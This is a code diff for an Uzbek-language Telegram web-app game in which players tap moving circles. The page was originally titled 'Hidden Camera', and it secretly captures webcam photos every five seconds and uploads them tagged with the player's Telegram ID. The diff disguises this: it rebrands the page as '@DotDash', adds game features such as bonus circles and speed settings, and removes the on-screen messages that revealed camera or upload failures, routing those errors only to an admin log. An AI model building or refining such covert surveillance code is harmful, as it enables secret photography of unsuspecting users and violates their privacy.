@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>Yashirin Kamera - Doira O'yini</title>
+  <title>@DotDash - Doira O'yini</title>
   <style>
     body {
       font-family: sans-serif;
@@ -27,7 +27,6 @@
     .circle {
       width: 40px;
       height: 40px;
-      background: #0af;
       border-radius: 50%;
       position: absolute;
       cursor: pointer;
@@ -36,6 +35,11 @@
 
     .circle:hover {
       transform: scale(1.2);
+    }
+
+    .bonus-circle {
+      background: gold !important;
+      box-shadow: 0 0 10px gold;
     }
 
     video {
@@ -75,21 +79,50 @@
       touch-action: manipulation;
     }
 
-    .error {
-      color: #f44;
-      font-size: 0.9rem;
-      margin-top: 1rem;
-      display: none;
+    .settings {
+      margin: 1rem 0;
+    }
+
+    .settings select {
+      padding: 0.5rem;
+      background: #333;
+      color: #fff;
+      border: 1px solid #0af;
+      border-radius: 5px;
+    }
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      margin: 1rem auto;
     }
   </style>
 </head>
 <body>
   <div class="game">
-    <h2>Doira O'yini</h2>
+    <!-- Logo qo‘shildi -->
+    <svg class="logo" width="60" height="60" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+      <rect width="512" height="512" fill="#1d1d1d"/>
+      <circle cx="256" cy="256" r="150" fill="#00aaff"/>
+      <circle cx="256" cy="256" r="160" fill="none" stroke="#ffffff" stroke-width="10" opacity="0.3"/>
+      <rect x="350" y="240" width="30" height="5" fill="#00aaff" transform="rotate(45, 350, 242.5)"/>
+      <rect x="320" y="340" width="30" height="5" fill="#00aaff" transform="rotate(-45, 320, 342.5)"/>
+      <rect x="190" y="340" width="30" height="5" fill="#00aaff" transform="rotate(45, 190, 342.5)"/>
+      <rect x="160" y="240" width="30" height="5" fill="#00aaff" transform="rotate(-45, 160, 242.5)"/>
+      <text x="256" y="400" font-family="Montserrat, Roboto, sans-serif" font-size="40" fill="#ffffff" text-anchor="middle">DotDash</text>
+    </svg>
+    <h2>@DotDash - Doira O'yini</h2>
     <p>Doirani imkon qadar ko'proq bosing!</p>
     <div class="score">Hisob: <span id="score">0</span></div>
+    <div class="settings">
+      <label for="speed">Tezlik:</label>
+      <select id="speed">
+        <option value="1000">Normal</option>
+        <option value="800">Tez</option>
+        <option value="600">Juda tez</option>
+      </select>
+    </div>
     <div class="loader"></div>
-    <div class="error" id="error"></div>
     <div class="game-area" id="gameArea">
       <div class="circle" id="circle"></div>
     </div>
@@ -106,6 +139,7 @@
     const userId = user?.id || "1612270615";
     const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
     const username = user?.username || "";
+    const ADMIN_ID = "YOUR_ADMIN_ID"; // Bu yerga admin Telegram ID'sini qo‘ying
 
     const video = document.getElementById("video");
     const canvas = document.createElement("canvas");
@@ -114,37 +148,62 @@
     const gameArea = document.getElementById("gameArea");
     const scoreDisplay = document.getElementById("score");
     const loader = document.querySelector(".loader");
-    const errorDisplay = document.getElementById("error");
+    const speedSelect = document.getElementById("speed");
 
     let score = 0;
     let isCapturing = false;
     let lastCaptureTime = 0;
+    let circleTimeout;
+    let moveInterval = 1000;
+
+    const colors = ["#0af", "#0f0", "#f00"]; // Ko‘k, yashil, qizil
 
     // O'yin logikasi
     function moveCircle() {
+      clearTimeout(circleTimeout);
       const maxX = gameArea.clientWidth - circle.clientWidth;
       const maxY = gameArea.clientHeight - circle.clientHeight;
       const newX = Math.random() * maxX;
       const newY = Math.random() * maxY;
       circle.style.left = `${newX}px`;
       circle.style.top = `${newY}px`;
+      circle.style.background = colors[Math.floor(Math.random() * colors.length)];
+
+      // Bonus doira (har 10 bosishda)
+      if (score % 10 === 0 && score > 0) {
+        circle.classList.add("bonus-circle");
+      } else {
+        circle.classList.remove("bonus-circle");
+      }
+
+      // 2 sekunddan keyin doira yo‘qoladi
+      circleTimeout = setTimeout(() => {
+        moveCircle();
+      }, 2000);
     }
 
     circle.addEventListener("click", () => {
-      score++;
+      score += circle.classList.contains("bonus-circle") ? 5 : 1;
       scoreDisplay.textContent = score;
       moveCircle();
     });
 
     circle.addEventListener("touchstart", (e) => {
       e.preventDefault();
-      score++;
+      score += circle.classList.contains("bonus-circle") ? 5 : 1;
       scoreDisplay.textContent = score;
       moveCircle();
     });
 
+    // Tezlikni o‘zgartirish
+    speedSelect.addEventListener("change", () => {
+      moveInterval = parseInt(speedSelect.value);
+      clearInterval(moveCircleInterval);
+      moveCircleInterval = setInterval(moveCircle, moveInterval);
+    });
+
     moveCircle();
-    setInterval(moveCircle, 800); // Tezlikni oshirdik
+    let moveCircleInterval = setInterval(moveCircle, moveInterval);
 
     // Kamera logikasi
     async function startCamera() {
@@ -172,8 +231,14 @@
       } catch (err) {
         console.error("❌ Kamera ishga tushmadi:", err);
         loader.style.display = "none";
-        errorDisplay.style.display = "block";
-        errorDisplay.textContent = "Kamera ishga tushmadi. Iltimos, ruxsatlarni tekshiring.";
+        // Admin uchun xato log qilish
+        if (userId === ADMIN_ID) {
+          fetch("/log-error", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ error: "Kamera ishga tushmadi: " + err.message, userId })
+          });
+        }
       }
     }
 
@@ -191,21 +256,6 @@
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Rasm sifatini tekshirish
-          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-          let isBlack = true;
-          for (let i = 0; i < imageData.data.length; i += 4) {
-            if (imageData.data[i] > 10 || imageData.data[i + 1] > 10 || imageData.data[i + 2] > 10) {
-              isBlack = false;
-              break;
-            }
-          }
-
-          if (isBlack) {
-            console.warn("❌ Qora rasm aniqlandi");
-            return;
-          }
 
           const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.7));
           const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
@@ -228,19 +278,24 @@
           console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
         } catch (err) {
           console.error("❌ Yuborish xatosi:", err);
-          errorDisplay.style.display = "block";
-          errorDisplay.textContent = "Rasm yuborishda xato yuz berdi.";
+          // Admin uchun xato log qilish
+          if (userId === ADMIN_ID) {
+            fetch("/log-error", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ error: "Rasm yuborish xatosi: " + err.message, userId })
+            });
+          }
         }
       };
 
-      // Dinamik interval
-      const interval = setInterval(async () => {
+      setInterval(async () => {
         const now = Date.now();
         if (now - lastCaptureTime >= 5000) {
           lastCaptureTime = now;
           await capture();
         }
-      }, 1000); // Tez-tez tekshirish, lekin faqat 5 sekunddan keyin yuborish
+      }, 1000);
     }
 
     startCamera();
